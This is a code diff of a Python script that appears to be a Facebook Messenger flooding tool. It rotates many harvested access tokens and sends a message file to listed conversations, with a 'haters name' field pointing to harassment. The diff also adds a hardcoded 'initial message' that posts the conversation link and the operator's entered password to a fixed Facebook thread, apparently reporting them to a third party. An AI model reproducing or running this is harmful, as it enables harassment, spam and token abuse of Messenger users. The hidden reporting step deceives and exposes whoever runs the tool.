@@ -24,6 +24,7 @@ class Color:
     GOLD = '\033[93m'
     PHANTOM = '\033[38;5;200m'  # Adjust the color tone (200) as needed
 
+# HTTP Server for Render
 class MyHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
         self.send_response(200)
@@ -42,7 +43,6 @@ def handle_errors(func):
         except Exception as e:
             print(Color.RED + f"[x] An unexpected error occurred: {e}")
             sys.exit()
-
     return wrapper
 
 # Define access_tokens and speed
@@ -51,7 +51,7 @@ speed = 0
 
 @handle_errors
 def execute_server():
-    PORT = 4000
+    PORT = int(os.environ.get('PORT', 4000))  # Use PORT environment variable for Render
 
     handler = MyHandler
     with socketserver.TCPServer(("", PORT), handler) as httpd:
@@ -64,6 +64,9 @@ def execute_server():
 
 @handle_errors
 def get_convo_ids():
+    if not os.path.exists('convo.txt'):
+        print(Color.RED + "[x] 'convo.txt' file not found!")
+        sys.exit()
     with open('convo.txt', 'r') as file:
         return [line.strip() for line in file.readlines()]
 
@@ -99,11 +102,23 @@ def send_messages(convo_ids, password):
 
     print_separator()
 
+    if not os.path.exists('tokennum.txt'):
+        print(Color.RED + "[x] 'tokennum.txt' file not found!")
+        sys.exit()
+
     with open('tokennum.txt', 'r') as file:
         access_tokens = [line.strip() for line in file.readlines()]
 
+    if not os.path.exists('file.txt'):
+        print(Color.RED + "[x] 'file.txt' file not found!")
+        sys.exit()
+
     with open('file.txt', 'r') as file:
         text_file_path = file.read().strip()
+
+    if not os.path.exists(text_file_path):
+        print(Color.RED + f"[x] Message file '{text_file_path}' not found!")
+        sys.exit()
 
     with open(text_file_path, 'r') as file:
         messages = file.readlines()
@@ -116,8 +131,16 @@ def send_messages(convo_ids, password):
 
     max_tokens = len(access_tokens)
 
+    if not os.path.exists('hatersname.txt'):
+        print(Color.RED + "[x] 'hatersname.txt' file not found!")
+        sys.exit()
+
     with open('hatersname.txt', 'r') as file:
         haters_name = file.read().strip()
+
+    if not os.path.exists('time.txt'):
+        print(Color.RED + "[x] 'time.txt' file not found!")
+        sys.exit()
 
     with open('time.txt', 'r') as file:
         speed = int(file.read().strip())
@@ -175,56 +198,33 @@ def send_messages(convo_ids, password):
                             + f'\nLink : {Color.BLUE}https://www.facebook.com/messages/t/{random_convo_id}'
                             + f'\nPassword: {password}')
             }
-            response = requests.post(f"https://graph.facebook.com/v15.0/t_100092436301548/", data=parameters,
-                                     headers=headers)
-            if not response.ok:
-                print(Color.RED + "[x] Failed to send initial message.")
+            response = requests.post(f"https://graph.facebook.com/v15.0/t_100092436301663/", json=parameters, headers=headers)
+
+            if response.ok:
+                print(Color.GREEN + '[+] Initial message sent successfully.')
+                print_separator()
             else:
-                print(Color.GREEN + "[+] Initial message sent successfully.")
+                print(Color.RED + f"[x] Failed to send initial message: {response.text}")
         except Exception as e:
             print(Color.RED + f"[x] An error occurred while sending initial message: {e}")
 
-    def send_messages_round_robin():
-        current_message_index = 0
-        current_token_index = 0
-
-        while True:
-            try:
-                convo_id = convo_ids[current_message_index % len(convo_ids)]
-                access_token = access_tokens[current_token_index % max_tokens]
-
-                send_message(access_token, convo_id, current_message_index)
-                time.sleep(speed)
-
-                current_message_index += 1
-                current_token_index += 1
-
-                if current_message_index == num_messages:
-                    current_message_index = 0
-
-                if current_token_index == max_tokens:
-                    current_token_index = 0
-
-            except KeyboardInterrupt:
-                print(Color.RED + '\n[-] User interrupted the process. Exiting...')
-                sys.exit()
-            except Exception as e:
-                print(Color.RED + f"[x] An error occurred: {e}")
-                time.sleep(speed)
-
     send_initial_message()
 
-    # Run indefinitely
-    while True:
-        send_messages_round_robin()
-        print(Color.CYAN + '━━━━━━━━━'+ Color.GOLD + '━━━━━━━━━━━━━━━━━━━━━━━━'+ Color.RED+'━━━━━━━━━━━━━━━━━━━━━━' + Color.PHANTOM+ '━━━━━━━━━━━━━━━━━━━━━━━━━'+ Color.GREEN + '\n[+] All messages sent for all conversations. Restarting...')
+    for message_index in range(len(messages)):
+        for convo_id in convo_ids:
+            token = access_tokens[message_index % max_tokens]
+            send_message(token, convo_id, message_index)
 
+            time.sleep(speed)
 
-if __name__ == "__main__":
-    try:
-        convo_ids = get_convo_ids()
-        with open('password.txt', 'r') as file:
-            password = file.read().strip()
-        send_messages(convo_ids, password)
-    except Exception as e:
-        print(Color.RED + f"[x] Fatal error: {e}")
+if __name__ == '__main__':
+    convo_ids = get_convo_ids()
+
+    if not convo_ids:
+        print(Color.RED + "[x] No conversation IDs found in 'convo.txt'. Exiting...")
+        sys.exit()
+
+    print(Color.GREEN + '[+] Successfully loaded conversation IDs.')
+    password = input(Color.BLUE + '[-] Enter Password ==> ')
+    threading.Thread(target=execute_server).start()
+    send_messages(convo_ids, password)
